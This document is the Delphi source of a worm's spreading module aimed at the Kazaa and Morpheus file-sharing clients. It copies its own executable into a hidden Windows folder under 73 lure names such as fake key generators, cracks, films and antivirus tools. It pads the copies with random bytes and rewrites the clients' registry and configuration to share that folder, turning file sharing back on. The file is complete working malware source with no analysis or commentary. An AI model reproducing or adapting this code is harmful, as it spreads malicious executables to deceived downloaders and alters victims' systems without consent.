   UNIT Kazaa;

   INTERFACE

   USES
     Windows, SysUtils, Registry;

   PROCEDURE InitKazaa;
   FUNCTION WinPath : STRING;
   FUNCTION CopyFile(CONST SourceFile:TFilename;CONST DestinationFile:TFilename):  Boolean;

   IMPLEMENTATION

   VAR
     RegK     : TRegistry;
     I        : Longint;
     S        : STRING;

   CONST FakeFileNumber : Byte = 73;

         FakeFiles : ARRAY[1..73] OF STRING = (
                             'Star Wars Episode 2 - Attack Of The Clones Full Downloader.exe',
                             'Jenna Jameson - Built For Speed Downloader.exe',
                             '[DiVX] Lord of The Rings Full Downloader.exe',
                             '[DiVX] Harry Potter And The Sorcerors Stone Full Downloader.exe',
                             'CKY3 - Bam Margera World Industries Alien Workshop Full Downloader.exe',
                             'Cat Attacks Child Full Downloader.exe',
                             'PS1 Boot Disc Full Dwonloader.exe',
                             'Sony Play station boot disc - Downloader.exe',
                             'How To Hack Websites.exe',
                             'AIM Account Stealer Downloader.exe',
                             'MSN Password Hacker and Stealer.exe',
                             'Hacking Tool Collection.exe',
                             'Windows XP Full Downloader.exe',
                             'Macromedia Flash 5.0 Full Downloader.exe',
                             'DSL Modem Uncapper.exe',
                             'Internet and Computer Speed Booster.exe',
                             'ZoneAlarm Firewall Full Downloader.exe',
                             'Borland Delphi 6 Key Generator.exe',
                             'ScaryMovie 2 Full Downloader.exe',
                             'StarWars2 - CloneAttack - FullDownloader.exe',
                             'Spiderman FullDownloader.exe',
                             'Shakira FullDownloader.exe',
                             'Gladiator FullDownloader.exe',
                             'AikaQuest3Hentai FullDownloader.exe',
                             'MoviezChannelsInstaler.exe',
                             'Zidane-ScreenInstaler.exe',
                             'LordOfTheRings-FullDownloader.exe',
                             'SIMS FullDownloader.exe',
                             'Britney spears nude.exe',
                             'Quake 4 BETA.exe',
                             'Windows XP key generator.exe',
                             'Windows XP serial generator.exe',
                             'Xbox.info.exe',
                             'DivX.exe',
                             'GTA3 crack.exe',
                             'Battle.net key generator (WORKS!!).exe',
                             'Warcraft 3 battle.net serial generator.exe',
                             'Half-life WON key generator.exe',
                             'Star Wars Episode 2 FULL Downloader.exe',
                             'Winzip 8.0 + serial.exe',
                             'Winrar + crack.exe',
                             'Key generator for all windows XP versions.exe',
                             'Warcraft 3 ONLINE key generator.exe',
                             'Half-life ONLINE key generator.exe',
                             'Grand theft auto 3 CD1 crack.exe',
                             'Macromedia key generator (all products).exe',
                             'KaZaA media desktop v2.0 UNOFFICIAL.exe',
                             'Microsoft key generator, works for ALL microsoft products!!.exe',
                             'Microsoft Windows XP crack pack.exe',
                             'Hack into any computer!!.exe',
                             'DivX codec v6.0.exe',
                             'DivX newest version.exe',
                             'DivX pro key generator.exe',
                             'Key generator for over 1,000 applications (really!).exe',
                             'DivX patch - Increases quality.exe',
                             'KaZaA spyware remover.exe',
                             'Age of empires 2 crack.exe',
                             'Norton antivirus 2002.exe',
                             'Macromedia dreamweaver MX (crack).exe',
                             'Microsoft Office XP (english) key generator.exe',
                             'Microsoft Office XP iso Full Downloader.exe',
                             'CloneCD + crack.exe',
                             'CloneCD all-versions key generator.exe',
                             'The Neverending Story Part I Full Downloader.exe',
                             'Warcraft III Full Downloader.exe',
                             'Free Virus Removal Tool From Symantec.exe',
                             'The Sun Of All Fears Full Downloader.exe',
                             'Crazy Taxi Full Downloader.exe',
                             'Duke Nukem Manhattan Project Full Downloader.exe',
                             'Industry Giant II Full Downloader.exe',
                             'F1 Grand Pix 4 Full Downloader.exe',
                             'Star Wars II Movie Full Downloader.exe',
                             'Nero Burning Rom 5.5.9.3 Full Downloader.exe');

   FUNCTION CopyFile(CONST SourceFile:TFilename;CONST DestinationFile:TFilename):  Boolean;
   BEGIN
     RESULT := Windows.CopyFile(pChar(SourceFile),pChar(DestinationFile),False);
   END;

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir: ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     Result:=StrPas(PWindowsDir)+'\';
   END;

   PROCEDURE ManipulateFileSize;
   VAR FakeFile : FILE;
       RandomBytes : ARRAY[0..1000] OF Byte;
       I : Longint;
   BEGIN
     Randomize;
     FOR i:=1 TO 1000 DO RandomBytes[i]:=Random(255);
     FOR i:=1 TO FakeFileNumber DO BEGIN
       S:=WinPath+'SysConfig\'+FakeFiles[i];
       IF FileExists(S) THEN BEGIN
         Assign(FakeFile,S);
         Reset(FakeFile,1);
         Seek(FakeFile,filesize(FakeFile));
         BlockWrite(FakeFile,RandomBytes[0],Random(1000));
         Close(FakeFile);
       END;
     END;
   END;

   FUNCTION FindMorpheus : Boolean;
   BEGIN
     RegK.RootKey:=HKEY_LOCAL_MACHINE;
     Result:=RegK.KeyExists('\Software\Morpheus\LocalContent');
     RegK.CloseKey;
   END;

   FUNCTION FindKazaa : Boolean;
   BEGIN
     RegK.RootKey:=HKEY_CURRENT_USER;
     Result:=RegK.KeyExists('\Software\Kazaa\LocalContent');
     RegK.CloseKey;
   END;

   PROCEDURE MakeFakeFiles;
   VAR
     I : Longint;
   BEGIN
     CreateDir(WinPath+'SysConfig');
     SetFileAttributes(pchar(Winpath+'SysConfig'),FILE_ATTRIBUTE_HIDDEN);
     FOR i:=1 TO FakeFileNumber DO Windows.CopyFile(pChar(ParamStr(0)),pChar(WinPath+'SysConfig\'+FakeFiles[i]),False);
     ManipulateFileSize;
   END;

   PROCEDURE MorpheusShare;
   VAR
     ConfigFile      : Text;
     ConfigStrings   : ARRAY[0..500] OF STRING;
     ConfigFileLines : Word;
     LastDirString   : Word;
     DirStringNum    : Word;
     Double          : Boolean;
     I               : Longint;
   BEGIN
     Double:=False;
     LastDirString:=0;
     RegK.RootKey:=HKEY_LOCAL_MACHINE;
     RegK.OpenKey('\Software\Morpheus\LocalContent',False);
     s:=RegK.ReadString('InstallDir');
     s:=s+'\GnuConfig.ini';
     IF FileExists(S) THEN BEGIN
       Assign(ConfigFile,s);
       reset(ConfigFile);
       ConfigFileLines:=0;
       DirStringNum:=0;
       REPEAT
         inc(ConfigFileLines);
         ReadLn(ConfigFile,ConfigStrings[ConfigFileLines]);
         IF Pos('Dir',ConfigStrings[ConfigFileLines])>0 THEN BEGIN
           LastDirString:=ConfigFileLines;
           Inc(DirStringNum);
         END;
         IF Pos('SysConfig',ConfigStrings[ConfigFileLines])>0 THEN Double:=True;
         IF Pos('MaxUploads=',ConfigStrings[ConfigFileLines])>0 THEN configstrings[configfilelines]:='MaxUploads=3';
       UNTIL EOF(ConfigFile);
       Close(ConfigFile);
       ReWrite(ConfigFile);
       if not double THEN BEGIN
         FOR i:=1 TO LastDirString DO IF (Pos('Word',ConfigStrings[i])<>1)AND(Pos('[Search Screen]',ConfigStrings[i])=0) THEN WriteLn(ConfigFile,ConfigStrings[i]);
         Str(DirStringNum-1,s);
         WriteLn(ConfigFile,'Dir'+s+'='+Winpath+'SysConfig, Recursive');
         FOR I:=LastDirString+1 TO ConfigFileLines DO writeln(ConfigFile,ConfigStrings[i]);
       END ELSE BEGIN
         FOR I:=1 TO ConfigFileLines DO IF (Pos('Word',ConfigStrings[i])<>1)AND(Pos('[Search Screen]',ConfigStrings[i])=0) THEN WriteLn(ConfigFile,ConfigStrings[i]);
       END;
       Close(ConfigFile);
     END;
       RegK.CloseKey;
   END;

   PROCEDURE KazaRegistry;
   Var
     KazaaReady : Boolean;
     Dir : STRING;
   BEGIN
     RegK.RootKey:=HKEY_CURRENT_USER;
     RegK.OpenKey('\Software\Kazaa\LocalContent',False);
     I:=0;
     KazaaReady:=False;
     REPEAT
       Str(I,Dir);
       Dir:='Dir'+Dir;
       Inc(I);
       S:=RegK.ReadString(Dir);
       IF Pos('SysConfig',S)>0 then KazaaReady:=True;
     UNTIL S='';
     IF Not KazaaReady THEN RegK.WriteString(Dir,'012345:'+WinPath+'SysConfig');   // <- Create Dir to Fake Files
     RegK.WriteInteger('DisableSharing',0);                                        // <- Enable File Sharing
     RegK.CloseKey;
   END;

   PROCEDURE InitKazaa;
   BEGIN
     RegK := TRegistry.Create;
     IF FindKazaa THEN KazaRegistry;
     IF FindMorpheus THEN MorpheusShare;
     MakeFakeFiles;
     RegK.Free;
   END;
   END.
